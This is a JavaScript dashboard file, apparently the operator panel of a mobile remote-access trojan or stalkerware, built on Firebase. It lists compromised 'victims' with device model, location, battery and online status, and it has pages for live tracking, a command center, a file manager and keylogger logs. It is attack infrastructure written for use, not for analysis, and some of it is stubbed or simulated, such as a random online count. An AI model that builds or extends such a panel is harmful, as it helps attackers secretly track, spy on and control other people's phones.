let currentUser = null;
let currentPage = 'dashboard';
let victimsRef = null;

// Auth state observer
// Auth state observer dengan guard yang bener
firebase.auth().onAuthStateChanged(async (user) => {
    if (!user) {
        // Ini penting: redirect cuma sekali, jangan render apapun
        window.location.replace('index.html'); // PAKAI replace, BUKAN href biar ga backlog history
        return;
    }
    
    // Cek apakah user valid
    try {
        // Ambil data user dari Firebase DB
        const snapshot = await firebase.database().ref(`users/${user.uid}`).once('value');
        const ownerSnapshot = await firebase.database().ref('settings/owner_uid').once('value');
        
        // Validasi akses
        if (!snapshot.exists() && user.uid !== ownerSnapshot.val()) {
            // User ga punya akses, force logout
            await firebase.auth().signOut();
            window.location.replace('index.html');
            return;
        }
        
        // Set global variable
        currentUser = user;
        window.currentUser = user; // biar global
        
        // Cek apakah owner
        window.isOwner = (user.uid === ownerSnapshot.val());
        
        // Tampilkan user info
        const userInfoEl = document.getElementById('userInfo');
        if (userInfoEl) {
            userInfoEl.querySelector('.user-email').textContent = user.email;
        }
        
        // Load page pertama
        loadPage('dashboard');
        
        // Setup listeners
        setupRealtimeListeners(user.uid, window.isOwner);
        
    } catch (error) {
        console.error('Auth check error:', error);
        // Kalo error, redirect aja
        window.location.replace('index.html');
    }
});

// Setup listeners Firebase
function setupRealtimeListeners(uid, isOwner) {
    // Listen to victims
    if (isOwner) {
        victimsRef = firebase.database().ref('victims');
    } else {
        victimsRef = firebase.database().ref(`victims/${uid}`);
    }
    
    victimsRef.on('value', (snapshot) => {
        const victims = snapshot.val() || {};
        const victimCount = Object.keys(victims).length;
        document.getElementById('victimCount').textContent = `${victimCount} victims`;
        
        // Update current page if needed
        if (currentPage === 'victims') {
            renderVictimsList(victims);
        } else if (currentPage === 'dashboard') {
            renderDashboard(victims);
        }
    });
}

// Load page based on navigation
function loadPage(page) {
    currentPage = page;
    
    // Update active nav
    document.querySelectorAll('.nav-item').forEach(item => {
        if (item.dataset.page === page) {
            item.classList.add('active');
        } else {
            item.classList.remove('active');
        }
    });
    
    // Update title
    const titles = {
        'dashboard': 'Dashboard',
        'victims': 'Victims List',
        'live': 'Live Tracking',
        'commands': 'Command Center',
        'files': 'File Manager',
        'keylogger': 'Keylogger Logs',
        'profile': 'Profile'
    };
    document.getElementById('pageTitle').textContent = titles[page] || 'Dashboard';
    
    // Load content
    const contentBody = document.getElementById('contentBody');
    
    if (page === 'profile') {
        window.location.href = 'profile.html';
        return;
    }
    
    // Render page content
    switch(page) {
        case 'dashboard':
            contentBody.innerHTML = '<div class="loading">Loading dashboard...</div>';
            // Will be filled by listener
            break;
        case 'victims':
            contentBody.innerHTML = '<div class="victims-grid"></div>';
            break;
        case 'live':
            contentBody.innerHTML = renderLivePage();
            break;
        case 'commands':
            contentBody.innerHTML = renderCommandsPage();
            break;
        case 'files':
            contentBody.innerHTML = renderFilesPage();
            break;
        case 'keylogger':
            contentBody.innerHTML = renderKeyloggerPage();
            break;
    }
}

// Render functions (simplified - akan diperpanjang)
function renderDashboard(victims) {
    let html = '<div class="dashboard-grid">';
    
    // Stats cards
    const victimCount = Object.keys(victims).length;
    html += `
        <div class="stat-card">
            <div class="stat-icon">👥</div>
            <div class="stat-content">
                <h3>Total Victims</h3>
                <p class="stat-number">${victimCount}</p>
            </div>
        </div>
    `;
    
    // Online status (simulasi)
    html += `
        <div class="stat-card">
            <div class="stat-icon">🟢</div>
            <div class="stat-content">
                <h3>Online Now</h3>
                <p class="stat-number">${Math.floor(Math.random() * victimCount)}</p>
            </div>
        </div>
    `;
    
    // Recent victims
    html += '<div class="recent-victims"><h3>Recent Victims</h3><div class="victim-list">';
    
    let count = 0;
    for (const [deviceId, deviceData] of Object.entries(victims)) {
        if (count++ >= 5) break;
        
        html += `
            <div class="victim-item" onclick="showVictimDetails('${deviceId}')">
                <div class="victim-icon">📱</div>
                <div class="victim-info">
                    <strong>${deviceData.deviceName || 'Unknown Device'}</strong>
                    <small>${deviceData.model || ''} • ${deviceData.country || 'Unknown'}</small>
                </div>
                <span class="status-badge ${deviceData.online ? 'online' : 'offline'}">
                    ${deviceData.online ? '🟢 Online' : '⚫ Offline'}
                </span>
            </div>
        `;
    }
    
    html += '</div></div></div>';
    
    document.getElementById('contentBody').innerHTML = html;
}

function renderVictimsList(victims) {
    let html = '<div class="victims-table"><table><thead><tr><th>Device</th><th>Model</th><th>Location</th><th>Battery</th><th>Status</th><th>Actions</th></tr></thead><tbody>';
    
    for (const [deviceId, deviceData] of Object.entries(victims)) {
        html += `
            <tr>
                <td>${deviceData.deviceName || 'Unknown'}</td>
                <td>${deviceData.model || ''}<br><small>${deviceData.os || ''}</small></td>
                <td>${deviceData.country || ''}<br><small>${deviceData.city || ''}</small></td>
                <td>${deviceData.battery || '?'}%</td>
                <td><span class="status-badge ${deviceData.online ? 'online' : 'offline'}">${deviceData.online ? 'Online' : 'Offline'}</span></td>
                <td>
                    <button onclick="openCommand('${deviceId}')" class="btn-small">⚡ Command</button>
                    <button onclick="openLive('${deviceId}')" class="btn-small">📍 Live</button>
                </td>
            </tr>
        `;
    }
    
    html += '</tbody></table></div>';
    
    document.querySelector('.victims-grid').innerHTML = html;
}

// Navigation
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', (e) => {
        e.preventDefault();
        const page = item.dataset.page;
        loadPage(page);
    });
});

// Logout
// Logout function yang bener
document.getElementById('logoutBtn').addEventListener('click', async (e) => {
    e.preventDefault();
    
    try {
        // Matikan semua listener Firebase dulu
        if (window.victimsRef) {
            window.victimsRef.off();
        }
        
        // Sign out
        await firebase.auth().signOut();
        
        // Clear local storage (opsional)
        localStorage.removeItem('firebase:previousUser');
        
        // Redirect pake replace
        window.location.replace('index.html');
        
    } catch (error) {
        console.error('Logout error:', error);
        // Force redirect kalo error
        window.location.replace('index.html');
    }
});

// Menu toggle untuk mobile
document.getElementById('menuToggle').addEventListener('click', () => {
    document.getElementById('sidebar').classList.toggle('active');
});

// Global functions
window.showVictimDetails = (deviceId) => {
    alert('Victim details for: ' + deviceId);
};

window.openCommand = (deviceId) => {
    loadPage('commands');
    // Set device ID in command form
};

window.openLive = (deviceId) => {
    loadPage('live');
    // Initialize live tracking
};
